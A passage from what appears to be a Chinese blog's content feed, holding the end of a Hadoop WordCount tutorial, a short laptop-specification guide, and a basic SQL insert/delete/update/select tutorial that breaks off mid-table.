/usr/joe/wordcount/input/<br>/usr/joe/wordcount/input/file01<br>/usr/joe/wordcount/input/file02</p><p>$ bin/hadoop dfs -cat /usr/joe/wordcount/input/file01<br>Hello World, Bye World!</p><p>$ bin/hadoop dfs -cat /usr/joe/wordcount/input/file02<br>Hello Hadoop, Goodbye to hadoop.</p><p>运行程序：</p><p>$ bin/hadoop jar /usr/joe/wordcount.jar org.myorg.WordCount /usr/joe/wordcount/input /usr/joe/wordcount/output</p><p>输出：</p><p>$ bin/hadoop dfs -cat /usr/joe/wordcount/output/part-00000<br>Bye 1<br>Goodbye 1<br>Hadoop, 1<br>Hello 2<br>World! 1<br>World, 1<br>hadoop. 1<br>to 1</p><p>注意此时的输入与第一个版本的不同，输出的结果也有不同。</p><p>现在通过DistributedCache插入一个模式文件，文件中保存了要被忽略的单词模式。</p><p>$ hadoop dfs -cat /user/joe/wordcount/patterns.txt<br>.<br>,<br>!<br>to</p><p>再运行一次，这次使用更多的选项：</p><p>$ bin/hadoop jar /usr/joe/wordcount.jar org.myorg.WordCount -Dwordcount.case.sensitive=true /usr/joe/wordcount/input /usr/joe/wordcount/output -skip /user/joe/wordcount/patterns.txt</p><p>应该得到这样的输出：</p><p>$ bin/hadoop dfs -cat /usr/joe/wordcount/output/part-00000<br>Bye 1<br>Goodbye 1<br>Hadoop 1<br>Hello 2<br>World 2<br>hadoop 1</p><p>再运行一次，这一次关闭大小写敏感性（case-sensitivity）：</p><p>$ bin/hadoop jar /usr/joe/wordcount.jar org.myorg.WordCount -Dwordcount.case.sensitive=false /usr/joe/wordcount/input /usr/joe/wordcount/output -skip /user/joe/wordcount/patterns.txt</p><p>输出：</p><p>$ bin/hadoop dfs -cat /usr/joe/wordcount/output/part-00000<br>bye 1<br>goodbye 1<br>hadoop 2<br>hello 2<br>world 2</p><p>通过使用一些Map/Reduce框架提供的功能，WordCount的第二个版本在原始版本基础上有了如下的改进：</p><ul><li>展示了应用程序如何在Mapper (和Reducer)中通过configure方法 修改配置参数(28-43行)。</li><li>展示了作业如何使用DistributedCache 来分发只读数据。 这里允许用户指定单词的模式，在计数时忽略那些符合模式的单词(104行)。</li><li>展示Tool接口和GenericOptionsParser处理Hadoop命令行选项的功能 (87-116, 119行)。</li><li>展示了应用程序如何使用Counters(68行)，如何通过传递给map（和reduce） 方法的Reporter实例来设置应用程序的状态信息(72行)。</li></ul><p><em>Java和JNI是Sun Microsystems, Inc.在美国和其它国家的注册商标。</em></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 大数据技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>五分钟读懂电脑配置</title>
      <link href="/2020/06/22/%E4%BA%94%E5%88%86%E9%92%9F%E8%AF%BB%E6%87%82%E7%94%B5%E8%84%91%E9%85%8D%E7%BD%AE/"/>
      <url>/2020/06/22/%E4%BA%94%E5%88%86%E9%92%9F%E8%AF%BB%E6%87%82%E7%94%B5%E8%84%91%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<p>简单介绍一下笔记本电脑配置（纪念2019.5.29晚上在一起学习、吹水的那段日子）</p><a id="more"></a><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>如果不明白电脑配置，那么看到CPU、GPU、内存这些名词也许会头痛。是的，实际解决问题中确实会经常跟这些接触，与其一直懵逼，不如花五分钟的时间了解一下吧。</p><h2 id="读懂电脑配置"><a href="#读懂电脑配置" class="headerlink" title="读懂电脑配置"></a>读懂电脑配置</h2><h3 id="电脑名称"><a href="#电脑名称" class="headerlink" title="电脑名称"></a>电脑名称</h3><p>每次在电商平台购买都会看到长长一串的名称，如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200621074731640.png" srcset="/img/loading.gif" lazyload="" alt="读懂电脑名称"></p><h3 id="笔记本电脑品牌"><a href="#笔记本电脑品牌" class="headerlink" title="笔记本电脑品牌"></a>笔记本电脑品牌</h3><p>电脑品牌就建议选一线品牌啦，即以下品牌（还有ThinkPad和Surface等等，说好的五分钟嘛，不多说了）</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200621075016084.png" srcset="/img/loading.gif" lazyload="" alt="推荐笔记本品牌及其系列"></p><h3 id="CPU"><a href="#CPU" class="headerlink" title="CPU"></a>CPU</h3><p>中央处理器简称“CPU”</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200621075350383.png" srcset="/img/loading.gif" lazyload="" alt="CPU分类"></p><p>CUP分为低压、标压、BGA封装H、四核Q，性能依次增强，一般游戏本才搭配H和Q，Q越充电性能越强。</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200621075435563.png" srcset="/img/loading.gif" lazyload="" alt="CPU天梯图"></p><p>基本上就代数越高就越强了，傻瓜式判别法，数字大的牛逼。</p><h3 id="GPU"><a href="#GPU" class="headerlink" title="GPU"></a>GPU</h3><p>显卡简称“GPU”</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200621075552752.png" srcset="/img/loading.gif" lazyload="" alt="CPU分类"></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200621075621257.png" srcset="/img/loading.gif" lazyload="" alt="显卡天梯图"></p><p>GPU对比同理</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200621075810392.png" srcset="/img/loading.gif" lazyload="" alt="显卡性能对比"></p><p>###　硬盘</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200621075907220.png" srcset="/img/loading.gif" lazyload="" alt=""></p><h3 id="屏幕"><a href="#屏幕" class="headerlink" title="屏幕"></a>屏幕</h3><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200621075947210.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p>色域越高颜色越饱和，需要注意的是刷新率不是越高越好，打游戏是刷新率越高越好；设计(3D建模、渲染等)用一般的刷新率即可，否则高刷新率成了累赘。</p><p>整篇文章结束了，有没有五分钟呢？(*σ´∀`)σ</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL增删改查</title>
      <link href="/2020/06/21/SQL%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/"/>
      <url>/2020/06/21/SQL%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/</url>
      
        <content type="html"><![CDATA[<p>数据库curd</p><a id="more"></a><p>内容来自<a href="https://www.w3school.com.cn/sql/index.asp" target="_blank" rel="noopener">W3school</a>，侵删</p><h2 id="增"><a href="#增" class="headerlink" title="增"></a>增</h2><h3 id="INSERT-INTO"><a href="#INSERT-INTO" class="headerlink" title="INSERT INTO"></a>INSERT INTO</h3><p>INSERT INTO 语句用于向表格中插入新的行。</p><p>基本语法：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> 表名称 <span class="hljs-keyword">VALUES</span> (值<span class="hljs-number">1</span>, 值<span class="hljs-number">2</span>,....)</code></pre></div><p>我们也可以指定所要插入数据的列：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> table_name (列<span class="hljs-number">1</span>, 列<span class="hljs-number">2</span>,...) <span class="hljs-keyword">VALUES</span> (值<span class="hljs-number">1</span>, 值<span class="hljs-number">2</span>,....)</code></pre></div><h3 id="插入新的行"><a href="#插入新的行" class="headerlink" title="插入新的行"></a>插入新的行</h3><p>“Persons” 表：</p><table><thead><tr><th align="left">LastName</th><th align="left">FirstName</th><th align="left">Address</th><th align="left">City</th></tr></thead><tbody><tr><td align="left">Carter</td><td align="left">Thomas</td><td align="left">Changan Street</td><td align="left">Beijing</td></tr></tbody></table><p>SQL 语句：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> Persons <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'Gates'</span>, <span class="hljs-string">'Bill'</span>, <span class="hljs-string">'Xuanwumen 10'</span>, <span class="hljs-string">'Beijing'</span>)</code></pre></div><p>结果：</p><table><thead><tr><th align="left">LastName</th><th align="left">FirstName</th><th align="left">Address</th><th align="left">City</th></tr></thead><tbody><tr><td align="left">Carter</td><td align="left">Thomas</td><td align="left">Changan Street</td><td align="left">Beijing</td></tr><tr><td align="left">Gates</td><td align="left">Bill</td><td align="left">Xuanwumen 10</td><td align="left">Beijing</td></tr></tbody></table><h3 id="在指定的列中插入数据"><a href="#在指定的列中插入数据" class="headerlink" title="在指定的列中插入数据"></a>在指定的列中插入数据</h3><p>“Persons” 表：</p><table><thead><tr><th align="left">LastName</th><th align="left">FirstName</th><th align="left">Address</th><th align="left">City</th></tr></thead><tbody><tr><td align="left">Carter</td><td align="left">Thomas</td><td align="left">Changan Street</td><td align="left">Beijing</td></tr><tr><td align="left">Gates</td><td align="left">Bill</td><td align="left">Xuanwumen 10</td><td align="left">Beijing</td></tr></tbody></table><p>SQL 语句：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> Persons (LastName, Address) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'Wilson'</span>, <span class="hljs-string">'Champs-Elysees'</span>)</code></pre></div><p>结果：</p><table><thead><tr><th align="left">LastName</th><th align="left">FirstName</th><th align="left">Address</th><th align="left">City</th></tr></thead><tbody><tr><td align="left">Carter</td><td align="left">Thomas</td><td align="left">Changan Street</td><td align="left">Beijing</td></tr><tr><td align="left">Gates</td><td align="left">Bill</td><td align="left">Xuanwumen 10</td><td align="left">Beijing</td></tr><tr><td align="left">Wilson</td><td align="left"></td><td align="left">Champs-Elysees</td><td align="left"></td></tr></tbody></table><h2 id="删"><a href="#删" class="headerlink" title="删"></a>删</h2><h3 id="DELETE-语句"><a href="#DELETE-语句" class="headerlink" title="DELETE 语句"></a>DELETE 语句</h3><p>DELETE 语句用于删除表中的行。</p><p>基本语法：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> 表名称 <span class="hljs-keyword">WHERE</span> 列名称 = 值</code></pre></div><p>Person:</p><table><thead><tr><th align="left">LastName</th><th align="left">FirstName</th><th align="left">Address</th><th align="left">City</th></tr></thead><tbody><tr><td align="left">Gates</td><td align="left">Bill</td><td align="left">Xuanwumen 10</td><td align="left">Beijing</td></tr><tr><td align="left">Wilson</td><td align="left">Fred</td><td align="left">Zhongshan 23</td><td align="left">Nanjing</td></tr></tbody></table><h3 id="删除某行"><a href="#删除某行" class="headerlink" title="删除某行"></a>删除某行</h3><p>“Fred Wilson” 会被删除：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> Person <span class="hljs-keyword">WHERE</span> LastName = <span class="hljs-string">'Wilson'</span></code></pre></div><p>结果:</p><table><thead><tr><th align="left">LastName</th><th align="left">FirstName</th><th align="left">Address</th><th align="left">City</th></tr></thead><tbody><tr><td align="left">Gates</td><td align="left">Bill</td><td align="left">Xuanwumen 10</td><td align="left">Beijing</td></tr></tbody></table><h3 id="删除所有行"><a href="#删除所有行" class="headerlink" title="删除所有行"></a>删除所有行</h3><p>可以在不删除表的情况下删除所有的行。这意味着表的结构、属性和索引都是完整的：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> table_name</code></pre></div><p>或者：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">DELETE</span> * <span class="hljs-keyword">FROM</span> table_name</code></pre></div><h2 id="改"><a href="#改" class="headerlink" title="改"></a>改</h2><h3 id="Update-语句"><a href="#Update-语句" class="headerlink" title="Update 语句"></a>Update 语句</h3><p>Update 语句用于修改表中的数据。</p><p>基本语法：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">UPDATE</span> 表名称 <span class="hljs-keyword">SET</span> 列名称 = 新值 <span class="hljs-keyword">WHERE</span> 列名称 = 某值</code></pre></div><p>Person:</p><table><thead><tr><th align="left">LastName</th><th align="left">FirstName</th><th align="left">Address</th><th align="left">City</th></tr></thead><tbody><tr><td align="left">Gates</td><td align="left">Bill</td><td align="left">Xuanwumen 10</td><td align="left">Beijing</td></tr><tr><td align="left">Wilson</td><td align="left"></td><td align="left">Champs-Elysees</td><td align="left"></td></tr></tbody></table><h3 id="更新某一行中的一个列"><a href="#更新某一行中的一个列" class="headerlink" title="更新某一行中的一个列"></a>更新某一行中的一个列</h3><p>我们为 lastname 是 “Wilson” 的人添加 firstname：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">UPDATE</span> Person <span class="hljs-keyword">SET</span> FirstName = <span class="hljs-string">'Fred'</span> <span class="hljs-keyword">WHERE</span> LastName = <span class="hljs-string">'Wilson'</span></code></pre></div><p>结果：</p><table><thead><tr><th align="left">LastName</th><th align="left">FirstName</th><th align="left">Address</th><th align="left">City</th></tr></thead><tbody><tr><td align="left">Gates</td><td align="left">Bill</td><td align="left">Xuanwumen 10</td><td align="left">Beijing</td></tr><tr><td align="left">Wilson</td><td align="left">Fred</td><td align="left">Champs-Elysees</td><td align="left"></td></tr></tbody></table><h3 id="更新某一行中的若干列"><a href="#更新某一行中的若干列" class="headerlink" title="更新某一行中的若干列"></a>更新某一行中的若干列</h3><p>我们会修改地址（address），并添加城市名称（city）：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">UPDATE</span> Person <span class="hljs-keyword">SET</span> Address = <span class="hljs-string">'Zhongshan 23'</span>, City = <span class="hljs-string">'Nanjing'</span><span class="hljs-keyword">WHERE</span> LastName = <span class="hljs-string">'Wilson'</span></code></pre></div><p>结果：</p><table><thead><tr><th align="left">LastName</th><th align="left">FirstName</th><th align="left">Address</th><th align="left">City</th></tr></thead><tbody><tr><td align="left">Gates</td><td align="left">Bill</td><td align="left">Xuanwumen 10</td><td align="left">Beijing</td></tr><tr><td align="left">Wilson</td><td align="left">Fred</td><td align="left">Zhongshan 23</td><td align="left">Nanjing</td></tr></tbody></table><h2 id="查"><a href="#查" class="headerlink" title="查"></a>查</h2><h3 id="SELECT-语句"><a href="#SELECT-语句" class="headerlink" title="SELECT 语句"></a>SELECT 语句</h3><p>SELECT 语句用于从表中选取数据。</p><p>结果被存储在一个结果表中（称为结果集）。</p><p>SQL SELECT 语法</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> 列名称 <span class="hljs-keyword">FROM</span> 表名称</code></pre></div><p>以及：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> 表名称</code></pre></div><p><strong>注释：</strong>SQL 语句对大小写不敏感。SELECT 等效于 select。</p><p>SQL SELECT 实例</p><p>如需获取名为 “LastName” 和 “FirstName” 的列的内容（从名为 “Persons” 的数据库表），请使用类似这样的 SELECT 语句：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> LastName,FirstName <span class="hljs-keyword">FROM</span> Persons</code></pre></div><p>“Persons” 表:</p><table><thead><tr><th align="left">Id</th><th align="left">LastName</th><th align="left">FirstName</th><th align="left">Address</th><th align="left">City</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">Adams</td><td align="left">John</td><td align="left">Oxford Street</td><td align="left">London</td></tr><tr><td align="left">2</td><td align="left">Bush</td><td align="left">George</td><td align="left">Fifth Avenue</td><td align="left">New York</td></tr><tr><td align="left">3</td><td align="left">Carter</td><td align="left">Thomas</td><td align="left">Changan Street</td><td align="left">Beijing</td></tr></tbody></table><p>结果：</p><table><thead><tr><th align="left">LastName</th><th align="left">FirstName</th></tr></thead><tbody><tr><td align="left">Adams</td><td align="left">John</td></tr><tr><td align="left">Bush</td><td align="left">George</td></tr><tr><td align="left">Carter</td><td align="left">Thomas</td></tr></tbody></table><p>SQL SELECT * 实例</p><p>现在我们希望从 “Persons” 表中选取所有的列。</p><p>请使用符号 * 取代列的名称，就像这样：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> Persons</code></pre></div><p><strong>提示：</strong>星号（*）是选取所有列的快捷方式。</p><p>结果：</p><table><thead><tr><th align="left">Id</th><th align="left">LastName</th><th align="left">FirstName</th><th align="left">Address</th><th align="left">City</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">Adams</td><td align="left">John</td><td align="left">Oxford Street</td><td align="left">London</td></tr><tr><td align="left">2</td><td align="left">Bush</td><td align="left">George</td><td align="left">Fifth Avenue</td><td align="left">New York</td></tr><tr><td align="left">3</td><td align="left">Carter</td><td align="left">Thomas</td><td align="left">Changan Street</td><td align="left">Beijing</td></tr></tbody></table><h4 id="SELECT-DISTINCT-语句"><a href="#SELECT-DISTINCT-语句" class="headerlink" title="SELECT DISTINCT 语句"></a>SELECT DISTINCT 语句</h4><p>在表中，可能会包含重复值。这并不成问题，不过，有时您也许希望仅仅列出不同（distinct）的值。</p><p>关键词 DISTINCT 用于返回唯一不同的值。</p><p>基本语法：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> 列名称 <span class="hljs-keyword">FROM</span> 表名称</code></pre></div><h4 id="使用-DISTINCT-关键词"><a href="#使用-DISTINCT-关键词" class="headerlink" title="使用 DISTINCT 关键词"></a>使用 DISTINCT 关键词</h4><p>如果要从 “Company” 列中选取所有的值，我们需要使用 SELECT 语句：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> Company <span class="hljs-keyword">FROM</span> Orders</code></pre></div><p>“Orders”表：</p><table><thead><tr><th align="left">Company</th><th align="left">OrderNumber</th></tr></thead><tbody><tr><td align="left">IBM</td><td align="left">3532</td></tr><tr><td align="left">W3School</td><td align="left">2356</td></tr><tr><td align="left">Apple</td><td align="left">4698</td></tr><tr><td align="left">W3School</td><td align="left">6953</td></tr></tbody></table><p>结果：</p><table><thead><tr><th align="left">Company</th></tr></thead><tbody><tr><td align="left">IBM</td></tr><tr><td align="left">W3School</td></tr><tr><td align="left">Apple</td></tr><tr><td align="left">W3School</td></tr></tbody></table><p>请注意，在结果集中，W3School 被列出了两次。</p><p>如需从 Company” 列中仅选取唯一不同的值，我们需要使用 SELECT DISTINCT 语句：</p><div class="hljs code-wrapper"><pre><code class="hljs SQL"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> Company <span class="hljs-keyword">FROM</span> Orders</code></pre></div><p>结果：</p><table><thead><tr><th align="left">Company</th></tr></thead><tbody><tr><td align="left">IBM</td></tr><tr><td align="left">W3School</td></tr><tr><td align="left">Apple</td></tr></tbody></table><p>现在，在结果集中，”W3School” 仅被列出了一次。</p><h3 id="WHERE语句"><a href="#WHERE语句" class="headerlink" title="WHERE语句"></a>WHERE语句</h3><p>如需有条件地从表中选取数据，可将 WHERE 子句添加到 SELECT 语句。</p><p>基本语法：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> 列名称 <span class="hljs-keyword">FROM</span> 表名称 <span class="hljs-keyword">WHERE</span> 列 运算符 值</code></pre></div><p>下面的运算符可在 WHERE 子句中使用：</p><table><thead><tr><th align="left">操作符</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">=</td><td align="left">等于</td></tr><tr><td align="left">&lt;&gt;</td><td align="left">不等于</td></tr><tr><td align="left">&gt;</td><td align="left">大于</td></tr><tr><td align="left">&lt;</td><td align="left">小于</td></tr><tr><td align="left">&gt;=</td><td align="left">大于等于</td></tr><tr><td align="left">&lt;=</td><td align="left">小于等于</td></tr><tr><td align="left">BETWEEN</td><td align="left">在某个范围内</td></tr><tr><td align="left">LIKE</td><td align="left">搜索某种模式</td></tr></tbody></table><p><strong>注释：</strong>在某些版本的 SQL 中，操作符 &lt;&gt; 可以写为 !=。</p><h4 id="使用-WHERE-子句"><a href="#使用-WHERE-子句" class="headerlink" title="使用 WHERE 子句"></a>使用 WHERE 子句</h4><p>如果只希望选取居住在城市 “Beijing” 中的人，我们需要向 SELECT 语句添加 WHERE 子句：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> Persons <span class="hljs-keyword">WHERE</span> City=<span class="hljs-string">'Beijing'</span></code></pre></div><p>“Persons” 表</p><table><thead><tr><th align="left">LastName</th><th align="left">FirstName</th><th align="left">Address</th><th align="left">City</th><th align="left">Year</th></tr></thead><tbody><tr><td align="left">Adams</td><td align="left">John</td><td align="left">Oxford Street</td><td align="left">London</td><td align="left">1970</td></tr><tr><td align="left">Bush</td><td align="left">George</td><td align="left">Fifth Avenue</td><td align="left">New York</td><td align="left">1975</td></tr><tr><td align="left">Carter</td><td align="left">Thomas</td><td align="left">Changan Street</td><td align="left">Beijing</td><td align="left">1980</td></tr><tr><td align="left">Gates</td><td align="left">Bill</td><td align="left">Xuanwumen 10</td><td align="left">Beijing</td><td align="left">1985</td></tr></tbody></table><p>结果：</p><table><thead><tr><th align="left">LastName</th><th align="left">FirstName</th><th align="left">Address</th><th align="left">City</th><th align="left">Year</th></tr></thead><tbody><tr><td align="left">Carter</td><td align="left">Thomas</td><td align="left">Changan Street</td><td align="left">Beijing</td><td align="left">1980</td></tr><tr><td align="left">Gates</td><td align="left">Bill</td><td align="left">Xuanwumen 10</td><td align="left">Beijing</td><td align="left">1985</td></tr></tbody></table><h4 id="引号的使用"><a href="#引号的使用" class="headerlink" title="引号的使用"></a>引号的使用</h4><p>请注意，我们在例子中的条件值周围使用的是单引号。</p><p>SQL 使用单引号来环绕<em>文本值</em>（大部分数据库系统也接受双引号）。如果是<em>数值</em>，请不要使用引号。</p><p>文本值：</p><div class="hljs code-wrapper"><pre><code class="hljs sql">这是正确的：<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> Persons <span class="hljs-keyword">WHERE</span> FirstName=<span class="hljs-string">'Bush'</span>这是错误的：<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> Persons <span class="hljs-keyword">WHERE</span> FirstName=Bush</code></pre></div><p>数值：</p><div class="hljs code-wrapper"><pre><code class="hljs sql">这是正确的：<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> Persons <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">Year</span>&gt;<span class="hljs-number">1965</span>这是错误的：<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> Persons <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">Year</span>&gt;<span class="hljs-string">'1965'</span></code></pre></div><h3 id="AND-和-OR-运算符"><a href="#AND-和-OR-运算符" class="headerlink" title="AND 和 OR 运算符"></a>AND 和 OR 运算符</h3><p>AND 和 OR 可在 WHERE 子语句中把两个或多个条件结合起来。</p><p>如果第一个条件和第二个条件都成立，则 AND 运算符显示一条记录。</p><p>如果第一个条件和第二个条件中只要有一个成立，则 OR 运算符显示一条记录。</p><p>原始的表 (用在例子中的)：</p><table><thead><tr><th align="left">LastName</th><th align="left">FirstName</th><th align="left">Address</th><th align="left">City</th></tr></thead><tbody><tr><td align="left">Adams</td><td align="left">John</td><td align="left">Oxford Street</td><td align="left">London</td></tr><tr><td align="left">Bush</td><td align="left">George</td><td align="left">Fifth Avenue</td><td align="left">New York</td></tr><tr><td align="left">Carter</td><td align="left">Thomas</td><td align="left">Changan Street</td><td align="left">Beijing</td></tr><tr><td align="left">Carter</td><td align="left">William</td><td align="left">Xuanwumen 10</td><td align="left">Beijing</td></tr></tbody></table><h4 id="AND-运算符实例"><a href="#AND-运算符实例" class="headerlink" title="AND 运算符实例"></a>AND 运算符实例</h4><p>使用 AND 来显示所有姓为 “Carter” 并且名为 “Thomas” 的人：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> Persons <span class="hljs-keyword">WHERE</span> FirstName=<span class="hljs-string">'Thomas'</span> <span class="hljs-keyword">AND</span> LastName=<span class="hljs-string">'Carter'</span></code></pre></div><p>结果：</p><table><thead><tr><th align="left">LastName</th><th align="left">FirstName</th><th align="left">Address</th><th align="left">City</th></tr></thead><tbody><tr><td align="left">Carter</td><td align="left">Thomas</td><td align="left">Changan Street</td><td align="left">Beijing</td></tr></tbody></table><h4 id="OR-运算符实例"><a href="#OR-运算符实例" class="headerlink" title="OR 运算符实例"></a>OR 运算符实例</h4><p>使用 OR 来显示所有姓为 “Carter” 或者名为 “Thomas” 的人：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> Persons <span class="hljs-keyword">WHERE</span> firstname=<span class="hljs-string">'Thomas'</span> <span class="hljs-keyword">OR</span> lastname=<span class="hljs-string">'Carter'</span></code></pre></div><p>结果：</p><table><thead><tr><th align="left">LastName</th><th align="left">FirstName</th><th align="left">Address</th><th align="left">City</th></tr></thead><tbody><tr><td align="left">Carter</td><td align="left">Thomas</td><td align="left">Changan Street</td><td align="left">Beijing</td></tr><tr><td align="left">Carter</td><td align="left">William</td><td align="left">Xuanwumen 10</td><td align="left">Beijing</td></tr></tbody></table><h4 id="结合-AND-和-OR-运算符"><a href="#结合-AND-和-OR-运算符" class="headerlink" title="结合 AND 和 OR 运算符"></a>结合 AND 和 OR 运算符</h4><p>我们也可以把 AND 和 OR 结合起来（使用圆括号来组成复杂的表达式）:</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> Persons <span class="hljs-keyword">WHERE</span> (FirstName=<span class="hljs-string">'Thomas'</span> <span class="hljs-keyword">OR</span> FirstName=<span class="hljs-string">'William'</span>)<span class="hljs-keyword">AND</span> LastName=<span class="hljs-string">'Carter'</span></code></pre></div><p>结果：</p><table><thead><tr><th align="left">LastName</th><th align="left">FirstName</th><th align="left">Address</th><th align="left">City</th></tr></thead><tbody><tr><td align="left">Carter</td><td align="left">Thomas</td><td align="left">Changan Street</td><td align="left">Beijing</td></tr><tr><td align="left">Carter</td><td align="left">William</td><td align="left">Xuanwumen 10</td><td align="left">Beijing</td></tr></tbody></table><h2 id="ORDER-BY-语句"><a href="#ORDER-BY-语句" class="headerlink" title="ORDER BY 语句"></a>ORDER BY 语句</h2><p>ORDER BY 语句用于根据指定的列对结果集进行排序。</p><p>ORDER BY 语句默认按照升序对记录进行排序。</p><p>如果您希望按照降序对记录进行排序，可以使用 DESC 关键字。</p><h4 id="原始的表-用在例子中的-："><a href="#原始的表-用在例子中的-：" class="headerlink" title="原始的表 (用在例子中的)："></a>原始的表 (用在例子中的)：</h4><p>Orders 表:</p><table><thead><tr><th align="left">Company</th><th align="left">OrderNumber</th></tr></thead><tbody><tr><td align="left">IBM</td><td align="left">3532</td></tr><tr><td align="left">W3School</td><td align="left">2356</td></tr><tr><td align="left">Apple</td><td align="left">4698</td></tr><tr><td align="left">W3School</td><td align="left">6953</td></tr></tbody></table><h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例 1"></a>实例 1</h4><p>以字母顺序显示公司名称：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> Company, OrderNumber <span class="hljs-keyword">FROM</span> Orders <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> Company</code></pre></div><p>结果：</p><table><thead><tr><th align="left">Company</th><th align="left">OrderNumber</th></tr></thead><tbody><tr><td align="left">Apple</td><td align="left">4698</td></tr><tr><td align="left">IBM</td><td align="left">3532</td></tr><tr><td align="left">W3School</td><td align="left">6953</td></tr><tr><td align="left">W3School</td><td align="left">2356</td></tr></tbody></table><h4 id="实例-2"><a href="#实例-2" class="headerlink" title="实例 2"></a>实例 2</h4><p>以字母顺序显示公司名称（Company），并以数字顺序显示顺序号（OrderNumber）：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> Company, OrderNumber <span class="hljs-keyword">FROM</span> Orders <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> Company, OrderNumber</code></pre></div><p>结果：</p><table><thead><tr><th align="left">Company</th><th 